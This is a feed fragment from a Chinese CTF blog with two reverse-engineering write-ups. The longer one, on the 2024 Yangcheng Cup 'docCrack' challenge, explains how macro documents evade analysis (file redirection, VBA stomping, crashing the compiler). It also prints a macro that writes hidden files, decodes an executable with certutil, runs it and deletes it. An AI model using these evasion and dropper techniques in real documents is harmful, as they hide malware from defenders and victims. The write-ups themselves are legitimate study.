class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line">0. MNZ 0 0 0</span><br><span class="line">1. MLZ -1 44 43</span><br><span class="line">2. XOR 0 0 2</span><br><span class="line">3. MLZ -1 25971 2</span><br><span class="line">4. MLZ -1 14554 3</span><br><span class="line">5. MLZ -1 22445 4</span><br><span class="line">6. MLZ -1 25411 5</span><br><span class="line">7. MLZ -1 3743 6</span><br><span class="line">8. MLZ -1 13391 7</span><br><span class="line">9. MLZ -1 12059 8</span><br><span class="line">10. MLZ -1 2554 9</span><br><span class="line">11. MLZ -1 15823 10</span><br><span class="line">12. MLZ -1 5921 11</span><br><span class="line">13. MLZ -1 18009 12</span><br><span class="line">14. MLZ -1 14823 13</span><br><span class="line">15. MLZ -1 4757 14</span><br><span class="line">16. MLZ -1 7754 15</span><br><span class="line">17. MLZ -1 22480 16</span><br><span class="line">18. MLZ -1 8371 17</span><br><span class="line">19. MLZ -1 12418 18</span><br><span class="line">20. MLZ -1 22738 19</span><br><span class="line">21. MLZ -1 16499 20</span><br><span class="line">22. MLZ -1 7132 21</span><br><span class="line">23. MLZ -1 22793 22</span><br><span class="line">24. MLZ -1 22307 23</span><br><span class="line">25. MLZ -1 12485 24</span><br><span class="line">26. MLZ -1 7936 25</span><br><span class="line">27. MLZ -1 26630 26</span><br><span class="line">28. MLZ -1 15483 27</span><br><span class="line">29. MLZ -1 6471 28</span><br><span class="line">30. MLZ -1 1806 29</span><br><span class="line">31. MLZ -1 22705 30</span><br><span class="line">32. MLZ -1 25019 31</span><br><span class="line">33. MLZ -1 16442 32</span><br><span class="line">34. MLZ -1 5145 33</span><br><span class="line">35. MLZ -1 15593 34</span><br><span class="line">36. MLZ -1 23867 35</span><br><span class="line">37. MLZ -1 23738 36</span><br><span class="line">38. MLZ -1 14086 37</span><br><span class="line">39. MLZ -1 23123 38</span><br><span class="line">40. MLZ -1 0 39</span><br><span class="line">41. XOR A1 38357 39</span><br><span class="line">42. SUB A39 A2 2</span><br><span class="line">43. XOR A1 51518 39</span><br><span class="line">44. SUB A39 A3 3</span><br><span class="line">45. XOR A1 42987 39</span><br><span class="line">46. SUB A39 A4 4</span><br><span class="line">47. XOR A1 37801 39</span><br><span class="line">48. SUB A39 A5 5</span><br><span class="line">49. XOR A1 65311 39</span><br><span class="line">50. SUB A39 A6 6</span><br><span class="line">51. XOR A1 50346 39</span><br><span class="line">52. SUB A39 A7 7</span><br><span class="line">53. XOR A1 57197 39</span><br><span class="line">54. SUB A39 A8 8</span><br><span class="line">55. XOR A1 64121 39</span><br><span class="line">56. SUB A39 A9 9</span><br><span class="line">57. XOR A1 52768 39</span><br><span class="line">58. SUB A39 A10 10</span><br><span class="line">59. XOR A1 59293 39</span><br><span class="line">60. SUB A39 A11 11</span><br><span class="line">61. XOR A1 46811 39</span><br><span class="line">62. SUB A39 A12 12</span><br><span class="line">63. XOR A1 51793 39</span><br><span class="line">64. SUB A39 A13 13</span><br><span class="line">65. XOR A1 58134 39</span><br><span class="line">66. SUB A39 A14 14</span><br><span class="line">67. XOR A1 61092 39</span><br><span class="line">68. SUB A39 A15 15</span><br><span class="line">69. XOR A1 43041 39</span><br><span class="line">70. SUB A39 A16 16</span><br><span class="line">71. XOR A1 53519 39</span><br><span class="line">72. SUB A39 A17 17</span><br><span class="line">73. XOR A1 49398 39</span><br><span class="line">74. SUB A39 A18 18</span><br><span class="line">75. XOR A1 43302 39</span><br><span class="line">76. SUB A39 A19 19</span><br><span class="line">77. XOR A1 45253 39</span><br><span class="line">78. SUB A39 A20 20</span><br><span class="line">79. XOR A1 60482 39</span><br><span class="line">80. SUB A39 A21 21</span><br><span class="line">81. XOR A1 43375 39</span><br><span class="line">82. SUB A39 A22 22</span><br><span class="line">83. XOR A1 42895 39</span><br><span class="line">84. SUB A39 A23 23</span><br><span class="line">85. XOR A1 49440 39</span><br><span class="line">86. SUB A39 A24 24</span><br><span class="line">87. XOR A1 61298 39</span><br><span class="line">88. SUB A39 A25 25</span><br><span class="line">89. XOR A1 39026 39</span><br><span class="line">90. SUB A39 A26 26</span><br><span class="line">91. XOR A1 52477 39</span><br><span class="line">92. SUB A39 A27 27</span><br><span class="line">93. XOR A1 59810 39</span><br><span class="line">94. SUB A39 A28 28</span><br><span class="line">95. XOR A1 63354 39</span><br><span class="line">96. SUB A39 A29 29</span><br><span class="line">97. XOR A1 43325 39</span><br><span class="line">98. SUB A39 A30 30</span><br><span class="line">99. XOR A1 37437 39</span><br><span class="line">100. SUB A39 A31 31</span><br><span class="line">101. XOR A1 45240 39</span><br><span class="line">102. SUB A39 A32 32</span><br><span class="line">103. XOR A1 58524 39</span><br><span class="line">104. SUB A39 A33 33</span><br><span class="line">105. XOR A1 52575 39</span><br><span class="line">106. SUB A39 A34 34</span><br><span class="line">107. XOR A1 44477 39</span><br><span class="line">108. SUB A39 A35 35</span><br><span class="line">109. XOR A1 44326 39</span><br><span class="line">110. SUB A39 A36 36</span><br><span class="line">111. XOR A1 51043 39</span><br><span class="line">112. SUB A39 A37 37</span><br><span class="line">113. XOR A1 43719 39</span><br><span class="line">114. SUB A39 A38 38</span><br><span class="line">115. MLZ -1 65534 0</span><br><span class="line">116. MLZ 0 0 0</span><br><span class="line">117. MNZ 0 0 0</span><br></pre></td></tr></table></figure><p>代码逻辑还是很明显的——</p><p>初始化，放一堆数字在2到38，A1依次和另一堆数字异或后减去Ai位置数放在i位</p><p>A1与38357异或后放在39位，[A39]减[A2]放在A2，[2]从25971变成12386</p><p>（异或具有对称性，得A1为-65536)</p><p>QFTASM Interpreter——<a href="https://darthnithin.github.io/qftasm-interpreter/qftasm.html">https://darthnithin.github.io/qftasm-interpreter/qftasm.html</a></p><p>跑一下，什么都没有——怎么绘世呢？</p><p>我们可以看到，A1使用的最多，但是没有初始值——要爆破了（已知头是OOO，O是79）</p><p>知道第一位是</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">65536</span>):</span><br><span class="line">    value = (i^<span class="number">38357</span>)</span><br><span class="line">    <span class="keyword">if</span> (value)-<span class="number">25971</span> == <span class="number">79</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(i)</span><br><span class="line"><span class="comment"># 61463</span></span><br></pre></td></tr></table></figure><p>把上面汇编塞一行——3. MLZ -1 61463 1，再放编译器跑一下，非常美丽的ascii出现了——</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">flag = [<span class="number">79</span>,<span class="number">79</span>,<span class="number">79</span>,<span class="number">123</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">95</span>,<span class="number">116</span>,<span class="number">104</span>,<span class="number">105</span>,<span class="number">115</span>,<span class="number">95</span>,<span class="number">108</span>,<span class="number">105</span>,<span class="number">102</span>,<span class="number">101</span>,<span class="number">95</span>,<span class="number">95</span>,<span class="number">95</span>,<span class="number">121</span>,<span class="number">111</span>,<span class="number">117</span>,<span class="number">114</span>,<span class="number">101</span>,<span class="number">95</span>,<span class="number">111</span>,<span class="number">110</span>,<span class="number">95</span>,<span class="number">121</span>,<span class="number">111</span>,<span class="number">117</span>,<span class="number">114</span>,<span class="number">95</span>,<span class="number">111</span>,<span class="number">119</span>,<span class="number">110</span>,<span class="number">125</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(flag[i]),end= <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#OOO&#123;in_this_life___youre_on_your_own&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;DEFCON-quals-Rev-ncHEVjuw-txt&quot;&gt;&lt;a href=&quot;#DEFCON-quals-Rev-ncHEVjuw-txt&quot; class=&quot;headerlink&quot; title=&quot;DEFCON quals | Rev  ncHEVjuw.txt&quot;&gt;</summary>
      
    
    
    
    
    <category term="Reverse Golly DEFCON" scheme="https://github.com/xyy9233/xyy9233.github.io.git/tags/Reverse-Golly-DEFCON/"/>
    
  </entry>
  
  <entry>
    <title>羊城杯2024 | Reverse_docCrack</title>
    <link href="https://github.com/xyy9233/xyy9233.github.io.git/2024/09/04/%F0%9F%90%8F%E7%BE%8A%E5%9F%8E%E6%9D%AF2024%20%20Reverse/"/>
    <id>https://github.com/xyy9233/xyy9233.github.io.git/2024/09/04/%F0%9F%90%8F%E7%BE%8A%E5%9F%8E%E6%9D%AF2024%20%20Reverse/</id>
    <published>2024-09-03T16:00:00.000Z</published>
    <updated>2024-09-16T07:53:19.369Z</updated>
    
    <content type="html"><![CDATA[<h1 id="🐏羊城杯2024-Reverse-docCrack"><a href="#🐏羊城杯2024-Reverse-docCrack" class="headerlink" title="🐏羊城杯2024 | Reverse_docCrack"></a>🐏羊城杯2024 | Reverse_docCrack</h1><p>题目链接：<a href="https://github.com/CTF-Archives/2024-YCB-Undergraduate/releases/download/v1.0/Reverse-docCrack.zip">Reverse-docCrack</a></p><p>一道很意外的逆向题目，打开一瞬间懵了一下。细细思考，之前有简单了解过宏病毒之类的。感觉是一道很有意思的题目，所以打算好好记录一下这道题。</p><p>记得之前<a href="https://blog.xinshi.fun/wp/yangcheng-2024/#reverse-doccrack">LilRan师傅发过该篇的题解</a>，qq空间往下滑一滑，发现之前有提到过类似的出题方法（VBA）（看来做的题实在是太少了——），果然光看师傅们的空间就能学到好多东西。</p><p>以下是学习笔记——</p><h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><p>参考文章——[VBA脚本文件重定向](<a href="https://mp.weixin.qq.com/s/QbX84NmVXNdV42W4PkNl_A">VBA脚本文件重定向 (qq.com)</a>)、[VBA隐藏技术stomping](<a href="https://mp.weixin.qq.com/s/VmVdvD9c6p9Hdo9MZiIyZg">VBA隐藏技术stomping (qq.com)</a>) 、[VBA脚本终章编译器崩溃](<a href="https://mp.weixin.qq.com/s/d2mULeMn9dft68hzZC3-yQ">VBA脚本终章编译器崩溃 (qq.com)</a>)</p><h3 id="VBA宏代码"><a href="#VBA宏代码" class="headerlink" title="VBA宏代码"></a>VBA宏代码</h3><p>将Office文档中嵌入以VBA(Visual Basic for Applications)编写的宏代码脚本，当运行Office文档时，便可以执行各种命令。</p><h3 id="VBA脚本文件重定向"><a href="#VBA脚本文件重定向" class="headerlink" title="VBA脚本文件重定向"></a>VBA脚本文件重定向</h3><p>为防止分析人员直接打开宏编辑器查看宏的源码，分析脚本功能，微软提供的工程加密工具仍能被替换脚本中的加密模块进行验证绕过，所以VBA脚本文件重定向对脚本默认文件vbaProject.bin进行替换，在打开文本时加载其他文件，增加分析者的分析复杂程度。</p><p>此处的脚本文件重定向，是将vbaProject.bin进行伪装，比如styIes.xmI（用大写i替换小写L），之后修改相关的三个文件以保证程序正常进行——</p><p><strong>根目录的[Content_Types].xml：</strong></p><p>添加一个标签</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Default Extension=&quot;xmI&quot; ContentType=&quot;application/vnd.ms-office.vbaProject&quot;/&gt;</span><br></pre></td></tr></table></figure><p><strong>\word_rels文件夹的</strong></p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240903225844894.png" alt="image-20240903225844894" style="zoom:50%;" /><p>修改vbaProject.bin.rles文件的名字为styIes.xmI.rels</p><p>将document.xml.rels文件中Target指向改为styIes.xmI (都是大写i)</p><h3 id="VBA隐藏技术stomping"><a href="#VBA隐藏技术stomping" class="headerlink" title="VBA隐藏技术stomping"></a>VBA隐藏技术stomping</h3><p>脚本重定向技术无法绕过Microsoft OLE分析工具的检测。</p><p>stomping 可以破坏 Microsoft Office 文档中的 VBA 源代码，对Microsoft OLE分析工具进行欺骗，干扰其分析结果。</p><p><strong>OLE分析工具</strong>是通过搜索”Attribut”这个特征来定位宏的位置。</p><blockquote><p>VBA二进制脚本文件中即包含了源码字符，又包含了P-Code，VBA中的P-Code，其本质是对源码字符的编译压缩，因此实现的功能是相同的，即VBA二进制脚本中存在两份功能一致的代码，只是存在的形式不同，而oletools不会去解析P-Code。</p><p>如果满足脚本编译环境和执行环境的VBA版本一致，可以修改源码部分，这样oletools解析的结果就是我们修改后的代码，而解释器依旧会执行旧代码</p></blockquote><h3 id="VBA编译器崩溃"><a href="#VBA编译器崩溃" class="headerlink" title="VBA编译器崩溃"></a>VBA编译器崩溃</h3><p>当脚本编译环境和执行环境的VBA版本不一致，编译器无法打开。<br>或者在vbaProject.bin文件中，修改Module&#x3D;后的值删除，（保留换行符0x0D,0x0A），后面信息信息需要前移，也可以使编译器崩溃</p><h3 id="修复崩溃"><a href="#修复崩溃" class="headerlink" title="修复崩溃"></a>修复崩溃</h3><p>根据上文提到的方法反推，可以试着修复VBA文件，查看崩溃原因是否是由Module信息的缺失引起的，如果是该原因，修复该处缺失的信息。</p><p>常规OFFICE文档文件中，在word目录下的vbaData.xml文件中含有模块信息。</p><p>在[b773fa65bb375e6fe6d387f301f6bf33219189ea1d4a06762e965a9eba7de4e8]中，vbaData.xml文件被重定位到iuM.dsn，因此我们打开iuM.dsn。</p><p>我们可以看到wne:name&#x3D;”Project.Module1.AutoOpen”，其中Project代表Project流，Module1是Module的名字，等于同我们自己生成文件的NewMacros，后门AutoOpen是函数名。</p><p>打开EbDYTPZ[.]vEypm文件，通过特征”&#x2F;&amp;H00000000“特征定位Module，可以发现该处并没有Module模块，确定攻击者将该字段抹除。</p><p>因此修复该文件需要Module的信息重新编辑进去，其余信息后移。</p><p>修复完脚本文件后，重新将文档文件打包，修改后缀，然后打开word，点击的编译器编辑按钮，发现VBA脚本编译器可以正常打开。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>VBA编译器崩溃技术与stomping和重定向技术没有冲突，三者可以相互组合使用，互补每个技术中存在的缺陷，</p><h2 id="回到这个题目"><a href="#回到这个题目" class="headerlink" title="回到这个题目"></a>回到这个题目</h2><p>(启用宏——)</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240904001558987.png" alt="image-20240904001558987"></p><p>拆开包发现没有重定向、运行宏文件也没有报错，直接用 oletools 反编译 P-code——</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install -U oletools[full]</span><br><span class="line">olevba -c protected_secret.docm &gt; code.vbs</span><br></pre></td></tr></table></figure><p>代码出来了</p><p>看看主要代码——</p><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">Result = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">For</span> i = <span class="number">1</span> <span class="keyword">To</span> <span class="built_in">Len</span>(inflag)</span><br><span class="line">            res = <span class="built_in">Chr</span>(<span class="built_in">Asc</span>(<span class="built_in">Mid</span>(inflag, i, <span class="number">1</span>)) <span class="keyword">Xor</span> <span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">            Result = Result &amp; res</span><br><span class="line">        <span class="keyword">Next</span> i</span><br><span class="line"> xpkdb = dWPtWzWvKrZRFrsAWZMGNjZQbCrgAImKXVUkOykXWeRltpUU + AMaKeZzlhAtdNANKAKwMNbKEKUWuQVZQbbCJIUog + BvEKpalonhsRIgbPkYPYbsbQGzIzvPitapncgtGKIo + yBILPYnXCUApVHExOtpKlnfTkVfexwgrFQOFIveA + pqdgalQAZJKIDySPundFqdITahrgAYveJXfZCOUHWnUDKXZwZU + pErQJcjFIvYQeIehtTPMaOgEwFvvjnaTkabtJDvpHbWG + QmLHKhwBebnYaryyPsFeBassnVEjIoURcqNseXyjyMdcDfFnag</span><br><span class="line"></span><br><span class="line">tempPath = ThisDocument.Path &amp; <span class="string">&quot;\temp1&quot;</span></span><br><span class="line">        <span class="keyword">Set</span> tempfile = fso.CreateTextFile(tempPath, <span class="literal">True</span>)</span><br><span class="line">        fso.GetFile(tempPath).Attributes = <span class="number">2</span></span><br><span class="line">        tempfile.WriteLine xpkdb</span><br><span class="line">        tempfile.Close</span><br><span class="line">        </span><br><span class="line">        batPath = ThisDocument.Path &amp; <span class="string">&quot;\temp.bat&quot;</span></span><br><span class="line">        <span class="keyword">Set</span> batFile = fso.CreateTextFile(batPath, <span class="literal">True</span>)</span><br><span class="line">        fso.GetFile(batPath).Attributes = <span class="number">2</span></span><br><span class="line">        batFile.WriteLine <span class="string">&quot;@echo off&quot;</span></span><br><span class="line">        batFile.WriteLine <span class="string">&quot;cd /d &quot;</span> &amp; ThisDocument.Path</span><br><span class="line">        batFile.WriteLine <span class="string">&quot;certutil -decode temp1 temp|certutil -decode temp temp.exe&quot;</span></span><br><span class="line">        batFile.WriteLine <span class="string">&quot;del temp&quot;</span></span><br><span class="line">        batFile.WriteLine <span class="string">&quot;temp.exe &quot;</span> &amp; <span class="string">&quot;&quot;&quot;&quot;</span> &amp; Result &amp; <span class="string">&quot;&quot;&quot;&quot;</span></span><br><span class="line">        batFile.WriteLine <span class="string">&quot;del temp.exe&quot;</span></span><br><span class="line">        batFile.Close</span><br><span class="line">        <span class="keyword">Set</span> objExec = objShell.Exec(batPath)</span><br><span class="line">        <span class="keyword">Set</span> objStdOut = objExec.StdOut</span><br><span class="line">        <span class="keyword">Do</span> <span class="keyword">While</span> <span class="keyword">Not</span> objStdOut.AtEndOfStream</span><br><span class="line">            output = <span class="built_in">Trim</span>(objStdOut.ReadLine)</span><br><span class="line">        <span class="keyword">Loop</span></span><br><span class="line">        output = <span class="built_in">Left</span>(output, <span class="built_in">Len</span>(output))</span><br><span class="line">        StartTime = Timer</span><br><span class="line">        <span class="keyword">Do</span> <span class="keyword">While</span> Timer &lt; StartTime + <span class="number">1</span></span><br><span class="line">            DoEvents</span><br><span class="line">        <span class="keyword">Loop</span></span><br><span class="line">        fso.DeleteFile batPath</span><br><span class="line">        fso.DeleteFile tempPath</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">If</span> output = <span class="string">&quot;good&quot;</span> <span class="keyword">Then</span></span><br><span class="line">            temp = <span class="built_in">MsgBox</span>(<span class="string">&quot;good!!!&quot;</span>, , <span class="string">&quot;congratulations!!!&quot;</span>)</span><br><span class="line">            <span class="keyword">Exit</span> <span class="keyword">Do</span></span><br><span class="line">        <span class="keyword">Else</span></span><br><span class="line">            temp = <span class="built_in">MsgBox</span>(<span class="string">&quot;Sorry, U are wrong!!!&quot;</span>, , <span class="string">&quot;Hacked_by_??????&quot;</span>)</span><br><span class="line">            isContinue = <span class="built_in">MsgBox</span>(<span class="string">&quot;Continue?&quot;</span>, vbYesNo + vbQuestion, <span class="string">&quot;Warning&quot;</span>)</span><br><span class="line">        <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">    <span class="keyword">Loop</span> <span class="keyword">While</span> isContinue = <span class="number">6</span></span><br></pre></td></tr></table></figure><p>flag每位异或7</p><p>temp1为两次base64加密后的文件，temp.bat为验证后保存结果的文件</p><p>断点下了，但是跑不起来，直接抠出来——</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 前面省略了</span></span><br><span class="line">xpkdb = dWPtWzWvKrZRFrsAWZMGNjZQbCrgAImKXVUkOykXWeRltpUU + AMaKeZzlhAtdNANKAKwMNbKEKUWuQVZQbbCJIUog + BvEKpalonhsRIgbPkYPYbsbQGzIzvPitapncgtGKIo + yBILPYnXCUApVHExOtpKlnfTkVfexwgrFQOFIveA + pqdgalQAZJKIDySPundFqdITahrgAYveJXfZCOUHWnUDKXZwZU + pErQJcjFIvYQeIehtTPMaOgEwFvvjnaTkabtJDvpHbWG + QmLHKhwBebnYaryyPsFeBassnVEjIoURcqNseXyjyMdcDfFnag</span><br><span class="line"></span><br><span class="line">exe = <span class="string">&quot;123.txt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(exe, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file.write(xpkdb)</span><br></pre></td></tr></table></figure><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240904014341602.png" alt="image-20240904014341602"></p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240904014522420.png" alt="image-20240904014522420"></p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240904014546252.png" alt="image-20240904014546252"></p><p>解码——</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">v7 = [<span class="number">0</span>]*<span class="number">54</span></span><br><span class="line">v7[<span class="number">0</span>] = <span class="number">4288</span></span><br><span class="line">v7[<span class="number">1</span>] = <span class="number">4480</span></span><br><span class="line">v7[<span class="number">2</span>] = <span class="number">5376</span></span><br><span class="line">v7[<span class="number">3</span>] = <span class="number">4352</span></span><br><span class="line">v7[<span class="number">4</span>] = <span class="number">5312</span></span><br><span class="line">v7[<span class="number">5</span>] = <span class="number">4160</span></span><br><span class="line">v7[<span class="number">6</span>] = <span class="number">7936</span></span><br><span class="line">v7[<span class="number">7</span>] = <span class="number">5184</span></span><br><span class="line">v7[<span class="number">8</span>] = <span class="number">6464</span></span><br><span class="line">v7[<span class="number">9</span>] = <span class="number">6528</span></span><br><span class="line">v7[<span class="number">10</span>] = <span class="number">5632</span></span><br><span class="line">v7[<span class="number">11</span>] = <span class="number">3456</span></span><br><span class="line">v7[<span class="number">12</span>] = <span class="number">7424</span></span><br><span class="line">v7[<span class="number">13</span>] = <span class="number">5632</span></span><br><span class="line">v7[<span class="number">14</span>] = <span class="number">6336</span></span><br><span class="line">v7[<span class="number">15</span>] = <span class="number">6528</span></span><br><span class="line">v7[<span class="number">16</span>] = <span class="number">6720</span></span><br><span class="line">v7[<span class="number">17</span>] = <span class="number">6144</span></span><br><span class="line">v7[<span class="number">18</span>] = <span class="number">6272</span></span><br><span class="line">v7[<span class="number">19</span>] = <span class="number">7488</span></span><br><span class="line">v7[<span class="number">20</span>] = <span class="number">6656</span></span><br><span class="line">v7[<span class="number">21</span>] = <span class="number">7296</span></span><br><span class="line">v7[<span class="number">22</span>] = <span class="number">7424</span></span><br><span class="line">v7[<span class="number">23</span>] = <span class="number">2432</span></span><br><span class="line">v7[<span class="number">24</span>] = <span class="number">2432</span></span><br><span class="line">v7[<span class="number">25</span>] = <span class="number">2432</span></span><br><span class="line">v7[<span class="number">26</span>] = <span class="number">5632</span></span><br><span class="line">v7[<span class="number">27</span>] = <span class="number">4416</span></span><br><span class="line">v7[<span class="number">28</span>] = <span class="number">3456</span></span><br><span class="line">v7[<span class="number">29</span>] = <span class="number">7168</span></span><br><span class="line">v7[<span class="number">30</span>] = <span class="number">6528</span></span><br><span class="line">v7[<span class="number">31</span>] = <span class="number">7488</span></span><br><span class="line">v7[<span class="number">32</span>] = <span class="number">6272</span></span><br><span class="line">v7[<span class="number">33</span>] = <span class="number">5632</span></span><br><span class="line">v7[<span class="number">34</span>] = <span class="number">3520</span></span><br><span class="line">v7[<span class="number">35</span>] = <span class="number">6208</span></span><br><span class="line">v7[<span class="number">36</span>] = <span class="number">5632</span></span><br><span class="line">v7[<span class="number">37</span>] = <span class="number">4736</span></span><br><span class="line">v7[<span class="number">38</span>] = <span class="number">6528</span></span><br><span class="line">v7[<span class="number">39</span>] = <span class="number">6400</span></span><br><span class="line">v7[<span class="number">40</span>] = <span class="number">7488</span></span><br><span class="line">v7[<span class="number">41</span>] = <span class="number">3520</span></span><br><span class="line">v7[<span class="number">42</span>] = <span class="number">5632</span></span><br><span class="line">v7[<span class="number">43</span>] = <span class="number">5184</span></span><br><span class="line">v7[<span class="number">44</span>] = <span class="number">3456</span></span><br><span class="line">v7[<span class="number">45</span>] = <span class="number">7488</span></span><br><span class="line">v7[<span class="number">46</span>] = <span class="number">7296</span></span><br><span class="line">v7[<span class="number">47</span>] = <span class="number">3200</span></span><br><span class="line">v7[<span class="number">48</span>] = <span class="number">6272</span></span><br><span class="line">v7[<span class="number">49</span>] = <span class="number">7424</span></span><br><span class="line">v7[<span class="number">50</span>] = <span class="number">2432</span></span><br><span class="line">v7[<span class="number">51</span>] = <span class="number">2432</span></span><br><span class="line">v7[<span class="number">52</span>] = <span class="number">2432</span></span><br><span class="line">v7[<span class="number">53</span>] = <span class="number">7808</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">54</span>):</span><br><span class="line">    flag += <span class="built_in">chr</span>(v7[i] &gt;&gt; <span class="number">6</span> ^ <span class="number">7</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># DASCTF&#123;Vba_1s_dangerous!!!_B1ware_0f_Macr0_V1ru5es!!!&#125;</span></span><br><span class="line"><span class="comment">#乐，如果不异或7，头六个是CFTDSA，妙喵</span></span><br></pre></td></tr></table></figure><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>一瞬觉得做的题太少了，怎么这个时候才发现这么好玩的题目</p><p>另一瞬觉得，现在了解到知道学到了，也是一件很幸福的事情——</p>]]></content>
    
    
      
      
